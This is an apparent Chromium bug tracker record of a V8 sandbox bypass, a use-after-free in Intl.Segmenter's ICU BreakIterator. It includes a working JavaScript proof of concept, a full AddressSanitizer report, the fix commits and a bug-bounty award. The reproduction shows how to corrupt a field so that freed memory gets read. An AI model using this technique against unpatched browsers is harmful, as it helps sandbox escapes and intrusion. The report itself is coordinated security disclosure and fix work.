# V8 Sandbox Bypass: Use-After-Free in Intl.Segmenter BreakIterator

| Field | Value |
|-------|-------|
| **Issue ID** | [472181383](https://issues.chromium.org/issues/472181383) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Sandbox |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | vs...@gmail.com |
| **Assignee** | em...@google.com |
| **Created** | 2025-12-29 |
| **Bounty** | $5,000.00 |

## Description

#### VULNERABILITY DETAILS

A use-after-free vulnerability exists in V8's Intl.Segmenter implementation. The JSSegmentIterator object contains a unicode\_string field that the GC uses to track reachability of the underlying UnicodeString. However, the ICU BreakIterator internally holds a raw pointer to this UnicodeString's buffer.

This seems similar to [bug 454734141](https://issues.chromium.org/issues/454734141)

#### VERSION

V8 Git Commit: 4ccc488f7ea37b66ae8756db5515f51c8f6ead63 (Sun Dec 28 21:33:00 2025 -0800)

#### REPRODUCTION CASE

```
d8 --fuzzing --sandbox-fuzzing --expose-gc bug.js

```
```
const segmenter = new Intl.Segmenter("en", { granularity: "word" });
const segments = segmenter.segment("hello world");
const iterator = segments[Symbol.iterator]();

// Field offset for unicode_string in JSSegmentIterator
const kUnicodeStringOffset = 20;

const addr = Sandbox.getAddressOf(iterator);
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

// Corrupt the unicode_string field to make GC think the UnicodeString is
// unreachable. We set it to 0x1 (an invalid tagged pointer).
memory.setUint32(addr + kUnicodeStringOffset, 0x1, true);

gc();

// Now the BreakIterator inside the iterator still holds a raw pointer
// to the now-freed UnicodeString's internal buffer.
// Calling next() causes RuleBasedBreakIterator::handleNext() to read
// from freed memory, triggering the use-after-free.
iterator.next();

```

**ASan Report**

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x7abe00000000,0x7bbe00000000)
External strings cage bounds: [0x7aafc0000000,0x7ab400000000)
=================================================================
==3324031==ERROR: AddressSanitizer: heap-use-after-free on address 0x7c5ff71cd44a at pc 0x55555970fd23 bp 0x7fffffffd570 sp 0x7fffffffd568
READ of size 2 at 0x7c5ff71cd44a thread T0
    #0 0x55555970fd22 in handleNext<icu_77::RBBIStateTableRowT<unsigned char>, &icu_77::TrieFunc8> third_party/icu/source/common/rbbi.cpp:807:5
    #1 0x55555970fd22 in icu_77::RuleBasedBreakIterator::handleNext() third_party/icu/source/common/rbbi.cpp:741:20
    #2 0x555559717742 in icu_77::RuleBasedBreakIterator::BreakCache::populateFollowing() third_party/icu/source/common/rbbi_cache.cpp:480:16
    #3 0x55555971741d in icu_77::RuleBasedBreakIterator::BreakCache::nextOL() third_party/icu/source/common/rbbi_cache.cpp:275:19
    #4 0x55555970c088 in next third_party/icu/source/common/rbbi_cache.h:92:33
    #5 0x55555970c088 in icu_77::RuleBasedBreakIterator::next() third_party/icu/source/common/rbbi.cpp:594:18
    #6 0x555557c02ad8 in v8::internal::JSSegmentIterator::Next(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSSegmentIterator>) src/objects/js-segment-iterator.cc:101:43
    #7 0x555556e5ca57 in v8::internal::Builtin_Impl_SegmentIteratorPrototypeNext(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:1174:28
    #8 0x55555bb30335 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #9 0x55555ba82769 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #10 0x55555ba7f51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #11 0x55555ba7f26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #12 0x55555704b4b6 in Call src/execution/simulator.h:216:12
    #13 0x55555704b4b6 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #14 0x55555704c926 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #15 0x555556cd059b in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1984:7
    #16 0x55555692c0d7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #17 0x555556964469 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5582:10
    #18 0x55555697076d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6590:37
    #19 0x55555696fba5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6498:18
    #20 0x555556973247 in v8::Shell::Main(int, char**) src/d8/d8.cc:7391:18
    #21 0x7ffff7c8b1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #22 0x7ffff7c8b28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #23 0x555556821029 in _start (v8/out/vanilla/d8+0x12cd029) (BuildId: c952a06373c588c8)

0x7c5ff71cd44a is located 10 bytes inside of 64-byte region [0x7c5ff71cd440,0x7c5ff71cd480)
freed by thread T0 here:
    #0 0x5555568c30b6 in free (v8/out/vanilla/d8+0x136f0b6) (BuildId: c952a06373c588c8)
    #1 0x555557ac49cf in __release_shared gen/third_party/libc++/src/include/__memory/shared_count.h:65:7
    #2 0x555557ac49cf in __release_shared gen/third_party/libc++/src/include/__memory/shared_count.h:100:25
    #3 0x555557ac49cf in ~shared_ptr gen/third_party/libc++/src/include/__memory/shared_ptr.h:501:17
    #4 0x555557ac49cf in void v8::internal::detail::Destructor<icu_77::UnicodeString>(void*) src/objects/managed-inl.h:21:3
    #5 0x555557c4799b in v8::internal::(anonymous namespace)::ManagedObjectFinalizerSecondPass(v8::WeakCallbackInfo<void> const&) src/objects/managed.cc:21:3
    #6 0x55555715a2e2 in Invoke src/handles/global-handles.cc:867:3
    #7 0x55555715a2e2 in v8::internal::GlobalHandles::InvokeSecondPassPhantomCallbacks() src/handles/global-handles.cc:768:18
    #8 0x55555715bd23 in v8::internal::GlobalHandles::PostGarbageCollectionProcessing(v8::GCCallbackFlags) src/handles/global-handles.cc:886:5
    #9 0x55555724c488 in operator() src/heap/heap.cc:1780:34
    #10 0x55555724c488 in InvokeExternalCallbacks<(lambda at ../../src/heap/heap.cc:1775:38)> src/heap/heap.cc:1534:3
    #11 0x55555724c488 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags, v8::internal::PerformHeapLimitCheck, v8::internal::PerformIneffectiveMarkCompactCheck) src/heap/heap.cc:1775:3
    #12 0x55555758b4ef in v8::internal::(anonymous namespace)::InvokeGC(v8::Isolate*, v8::internal::(anonymous namespace)::GCOptions) src/extensions/gc-extension.cc:209:17
    #13 0x555557589f8c in v8::internal::GCExtension::GC(v8::FunctionCallbackInfo<v8::Value> const&) src/extensions/gc-extension.cc:296:5
    #14 0x55555ba8452a in Builtins_CallApiCallbackGeneric setup-isolate-deserialize.cc
    #15 0x55555ba82769 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #16 0x55555ba7f51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #17 0x55555ba7f26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #18 0x55555704b4b6 in Call src/execution/simulator.h:216:12
    #19 0x55555704b4b6 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #20 0x55555704c926 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #21 0x555556cd059b in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1984:7
    #22 0x55555692c0d7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #23 0x555556964469 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5582:10
    #24 0x55555697076d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6590:37
    #25 0x55555696fba5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6498:18
    #26 0x555556973247 in v8::Shell::Main(int, char**) src/d8/d8.cc:7391:18
    #27 0x7ffff7c8b1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #28 0x7ffff7c8b28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #29 0x555556821029 in _start (v8/out/vanilla/d8+0x12cd029) (BuildId: c952a06373c588c8)

previously allocated by thread T0 here:
    #0 0x5555568c3354 in malloc (v8/out/vanilla/d8+0x136f354) (BuildId: c952a06373c588c8)
    #1 0x5555597cc68a in icu_77::UnicodeString::clone() const third_party/icu/source/common/unistr.cpp:376:44
    #2 0x555557ab7cbf in v8::internal::Intl::SetTextToBreakIterator(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::String>, icu_77::BreakIterator*) src/objects/intl-objects.cc:2621:47
    #3 0x555557c0229b in v8::internal::JSSegmentIterator::Create(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::String>, v8::internal::DirectHandle<v8::internal::Managed<icu_77::BreakIterator>>, v8::internal::JSSegmenter::Granularity) src/objects/js-segment-iterator.cc:48:7
    #4 0x555556e60a12 in v8::internal::Builtin_Impl_SegmentsPrototypeIterator(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-intl.cc:1246:16
    #5 0x55555bb30335 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #6 0x55555ba82769 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #7 0x55555ba7f51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #8 0x55555ba7f26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #9 0x55555704b4b6 in Call src/execution/simulator.h:216:12
    #10 0x55555704b4b6 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #11 0x55555704c926 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #12 0x555556cd059b in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1984:7
    #13 0x55555692c0d7 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1036:44
    #14 0x555556964469 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5582:10
    #15 0x55555697076d in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6590:37
    #16 0x55555696fba5 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6498:18
    #17 0x555556973247 in v8::Shell::Main(int, char**) src/d8/d8.cc:7391:18
    #18 0x7ffff7c8b1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #19 0x7ffff7c8b28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #20 0x555556821029 in _start (v8/out/vanilla/d8+0x12cd029) (BuildId: c952a06373c588c8)

SUMMARY: AddressSanitizer: heap-use-after-free third_party/icu/source/common/rbbi.cpp:807:5 in handleNext<icu_77::RBBIStateTableRowT<unsigned char>, &icu_77::TrieFunc8>
Shadow bytes around the buggy address:
  0x7c5ff71cd180: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa
  0x7c5ff71cd200: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00
  0x7c5ff71cd280: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00
  0x7c5ff71cd300: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa
  0x7c5ff71cd380: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00
=>0x7c5ff71cd400: 00 00 00 00 fa fa fa fa fd[fd]fd fd fd fd fd fd
  0x7c5ff71cd480: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa
  0x7c5ff71cd500: fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00
  0x7c5ff71cd580: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 fa
  0x7c5ff71cd600: fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa
  0x7c5ff71cd680: fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3324031==ABORTING

## V8 sandbox violation detected!

```

## Timeline

### cl...@appspot.gserviceaccount.com (2025-12-29)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6414405260476416.

### 24...@project.gserviceaccount.com (2025-12-29)

Testcase 6414405260476416 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6414405260476416.

### sk...@google.com (2025-12-29)

Failed to reproduce, assigning to V8 shepherd and setting provisional severity/priority/FoundIn

### ch...@google.com (2025-12-30)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### om...@chromium.org (2026-01-01)

This is a sandbox bypass in icu\_77. I see that ftang@ fixed a similar issue in the same `JSSegmentIterator` class recently.   

ftang@ can you take a look? Thanks.

### dx...@google.com (2026-02-18)

[Details redacted due to bug visibility]

Change-Id: I8a150d4e5d46c7c4c3d66f1950ef7b0af042b8ff  

<https://chrome-internal-review.git.corp.google.com/9031797>

### dx...@google.com (2026-02-18)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7581680>

[intl] Keep string with ICU break iterator

---


Expand for full commit details
```
     
    Store the text next to the ICU iterator in order to guarantee correct 
    lifetime. 
     
    Bug: 472181383, 474402856, 484054139, 484054140, 484054137, 484220944 
    Change-Id: I0a6fab76dd98bc1c3790756abe9b4e4016ba09e2 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7581680 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Reviewed-by: Igor Sheludko <ishell@chromium.org> 
    Reviewed-by: Omer Katz <omerkatz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105321}

```

---

Files:

- M `include/v8-internal.h`
- M `src/builtins/builtins-intl.cc`
- M `src/diagnostics/objects-printer.cc`
- M `src/objects/intl-objects.cc`
- M `src/objects/intl-objects.h`
- M `src/objects/js-break-iterator-inl.h`
- M `src/objects/js-break-iterator.cc`
- M `src/objects/js-break-iterator.h`
- M `src/objects/js-break-iterator.tq`
- M `src/objects/js-segment-iterator-inl.h`
- M `src/objects/js-segment-iterator.cc`
- M `src/objects/js-segment-iterator.h`
- M `src/objects/js-segment-iterator.tq`
- M `src/objects/js-segments-inl.h`
- M `src/objects/js-segments.cc`
- M `src/objects/js-segments.h`
- M `src/objects/js-segments.tq`
- M `src/profiler/heap-snapshot-generator.cc`
- M `src/sandbox/testing.cc`
- M `test/mjsunit/sandbox/regress/regress-454734141.js`

---

Hash: [c128277d3ad09c3ddd56bafdfc191ac6dd2b5ce5](https://chromiumdash.appspot.com/commit/c128277d3ad09c3ddd56bafdfc191ac6dd2b5ce5)  

Date: Wed Feb 18 13:25:02 2026


---

### 24...@project.gserviceaccount.com (2026-02-19)

ClusterFuzz testcase 4505376636469248 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_sandbox_testing&range=105320:105321

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### em...@google.com (2026-02-19)

The fix might need to be improved, specifically around the `raw()` usages.

### vs...@gmail.com (2026-04-08)

Hey, is there a timeline for when this bug will be reviewed by the VRP?

### em...@google.com (2026-05-11)

RE [comment#11](https://issues.chromium.org/issues/472181383#comment11): You might want to reach out to [security-vrp@chromium.org](mailto:security-vrp@chromium.org) regarding the VRP decision status.

### vs...@gmail.com (2026-05-11)

Thanks for the response. I will try it that way.

### dx...@google.com (2026-05-29)

Project: v8/v8  

Branch:  main  

Author:  Michael Lippautz [mlippautz@chromium.org](mailto:mlippautz@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7879914>

sandbox: Move regression tests into public repo

---


Expand for full commit details
```
     
    Bug: 517688821 
     
    Bug: 472181383, 474402856, 484054137,484054139, 484054140 
    Bug: 484220944 
    Change-Id: I21eb77742af1a6bf574a9f8d6d33247f25c44b79 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7879914 
    Reviewed-by: Arash Kazemi <arashk@chromium.org> 
    Commit-Queue: Michael Lippautz <mlippautz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#107656}

```

---

Files:

- A `test/mjsunit/sandbox/regress/regress-472181383.js`
- A `test/mjsunit/sandbox/regress/regress-474402856.js`
- A `test/mjsunit/sandbox/regress/regress-484054137.js`
- A `test/mjsunit/sandbox/regress/regress-484054139.js`
- A `test/mjsunit/sandbox/regress/regress-484054140.js`
- A `test/mjsunit/sandbox/regress/regress-484220944.js`

---

Hash: [3bb01464a8d669b614668d9661a8ead24871b96e](https://chromiumdash.appspot.com/commit/3bb01464a8d669b614668d9661a8ead24871b96e)  

Date: Fri May 29 10:50:56 2026


---

### ch...@google.com (2026-06-11)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
Baseline. V8 Sandbox read.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/472181383)*
